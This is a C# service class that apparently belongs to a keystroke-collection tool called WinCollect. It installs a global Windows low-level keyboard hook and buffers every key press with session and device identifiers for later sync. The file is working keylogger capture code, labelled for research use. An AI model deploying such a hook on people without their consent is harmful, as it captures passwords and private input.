using System.Runtime.InteropServices;
using Serilog;
using WinCollect.Infrastructure;
using WinCollect.Models;

namespace WinCollect.Services;

/// <summary>
/// Installs a global (system-wide) low-level keyboard hook using Windows API.
/// Captures all key events while monitoring is active.
/// NOTE: For research/education use only.
/// Uses raw Win32 virtual-key codes to avoid importing System.Windows.Forms.
/// </summary>
public sealed class KeyboardHookService : IDisposable
{
    // Win32 hook/message constants
    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN    = 0x0100;
    private const int WM_KEYUP      = 0x0101;
    private const int WM_SYSKEYDOWN = 0x0104;
    private const int WM_SYSKEYUP   = 0x0105;

    // Virtual-key code constants (from winuser.h) — avoids System.Windows.Forms dependency
    private const uint VK_BACK    = 0x08;
    private const uint VK_TAB     = 0x09;
    private const uint VK_RETURN  = 0x0D;
    private const uint VK_SHIFT   = 0x10;
    private const uint VK_CONTROL = 0x11;
    private const uint VK_MENU    = 0x12; // Alt
    private const uint VK_CAPITAL = 0x14;
    private const uint VK_ESCAPE  = 0x1B;
    private const uint VK_SPACE   = 0x20;
    private const uint VK_PRIOR   = 0x21; // PageUp
    private const uint VK_NEXT    = 0x22; // PageDown
    private const uint VK_END     = 0x23;
    private const uint VK_HOME    = 0x24;
    private const uint VK_LEFT    = 0x25;
    private const uint VK_UP      = 0x26;
    private const uint VK_RIGHT   = 0x27;
    private const uint VK_DOWN    = 0x28;
    private const uint VK_INSERT  = 0x2D;
    private const uint VK_DELETE  = 0x2E;
    private const uint VK_LWIN    = 0x5B;
    private const uint VK_RWIN    = 0x5C;
    private const uint VK_LSHIFT  = 0xA0;
    private const uint VK_RSHIFT  = 0xA1;
    private const uint VK_LCONTROL = 0xA2;
    private const uint VK_RCONTROL = 0xA3;
    private const uint VK_LMENU   = 0xA4; // Left Alt
    private const uint VK_RMENU   = 0xA5; // Right Alt

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern nint SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, nint hMod, uint dwThreadId);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool UnhookWindowsHookEx(nint hhk);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern nint CallNextHookEx(nint hhk, int nCode, nint wParam, nint lParam);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern nint GetModuleHandle(string lpModuleName);

    [StructLayout(LayoutKind.Sequential)]
    private struct KBDLLHOOKSTRUCT
    {
        public uint vkCode;
        public uint scanCode;
        public uint flags;
        public uint time;
        public nint dwExtraInfo;
    }

    private delegate nint LowLevelKeyboardProc(int nCode, nint wParam, nint lParam);

    private nint _hookId = nint.Zero;
    private LowLevelKeyboardProc? _hookCallback;
    private int _sequenceCounter;
    private readonly List<KeyEvent> _eventBuffer = new();
    private readonly object _bufferLock = new();

    public event EventHandler<KeyEvent>? KeyEventCaptured;
    public bool IsActive { get; private set; }

    public void Start()
    {
        if (IsActive) return;

        _sequenceCounter = 0;
        _hookCallback = HookCallback;

        using var proc   = System.Diagnostics.Process.GetCurrentProcess();
        using var module = proc.MainModule!;
        _hookId = SetWindowsHookEx(WH_KEYBOARD_LL, _hookCallback,
            GetModuleHandle(module.ModuleName!), 0);

        if (_hookId == nint.Zero)
        {
            var err = Marshal.GetLastWin32Error();
            Log.Error("Failed to install keyboard hook. Win32 error: {Error}", err);
            throw new InvalidOperationException($"Failed to install keyboard hook. Error: {err}");
        }

        IsActive = true;
        Log.Information("Global keyboard hook installed");
    }

    public void Stop()
    {
        if (!IsActive) return;
        if (_hookId != nint.Zero)
        {
            UnhookWindowsHookEx(_hookId);
            _hookId = nint.Zero;
        }
        IsActive = false;
        Log.Information("Global keyboard hook removed");
    }

    private nint HookCallback(int nCode, nint wParam, nint lParam)
    {
        if (nCode >= 0 && AppState.IsMonitoring)
        {
            var kb = Marshal.PtrToStructure<KBDLLHOOKSTRUCT>(lParam);

            string eventType = (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)
                ? "KEY_DOWN" : "KEY_UP";

            var ev = new KeyEvent
            {
                EventId   = Guid.NewGuid().ToString("N"),
                SessionId = AppState.CurrentSessionId ?? "unknown",
                DeviceId  = AppState.DeviceId ?? "unknown",
                Sequence  = Interlocked.Increment(ref _sequenceCounter),
                Timestamp = DateTime.UtcNow,
                EventType = eventType,
                Key       = VkToName(kb.vkCode),
                SyncStatus = "PENDING"
            };

            lock (_bufferLock) { _eventBuffer.Add(ev); }
            KeyEventCaptured?.Invoke(this, ev);
        }

        return CallNextHookEx(_hookId, nCode, wParam, lParam);
    }

    public List<KeyEvent> FlushBuffer()
    {
        lock (_bufferLock)
        {
            var copy = new List<KeyEvent>(_eventBuffer);
            _eventBuffer.Clear();
            return copy;
        }
    }

    /// <summary>Maps a Win32 virtual-key code to a human-readable name.</summary>
    private static string VkToName(uint vk) => vk switch
    {
        VK_BACK     => "Backspace",
        VK_TAB      => "Tab",
        VK_RETURN   => "Enter",
        VK_ESCAPE   => "Esc",
        VK_SPACE    => "Space",
        VK_PRIOR    => "PageUp",
        VK_NEXT     => "PageDown",
        VK_END      => "End",
        VK_HOME     => "Home",
        VK_LEFT     => "Left",
        VK_UP       => "Up",
        VK_RIGHT    => "Right",
        VK_DOWN     => "Down",
        VK_INSERT   => "Insert",
        VK_DELETE   => "Delete",
        VK_LWIN or VK_RWIN   => "Win",
        VK_SHIFT or VK_LSHIFT or VK_RSHIFT       => "Shift",
        VK_CONTROL or VK_LCONTROL or VK_RCONTROL => "Ctrl",
        VK_MENU or VK_LMENU or VK_RMENU          => "Alt",
        VK_CAPITAL  => "CapsLock",
        // F1–F24
        >= 0x70 and <= 0x87 => $"F{vk - 0x6F}",
        // 0–9 (top row)
        >= 0x30 and <= 0x39 => ((char)vk).ToString(),
        // A–Z
        >= 0x41 and <= 0x5A => ((char)vk).ToString(),
        // Numpad 0–9
        >= 0x60 and <= 0x69 => $"Num{vk - 0x60}",
        // Everything else — hex code
        _ => $"VK_{vk:X2}"
    };

    public void Dispose() => Stop();
}
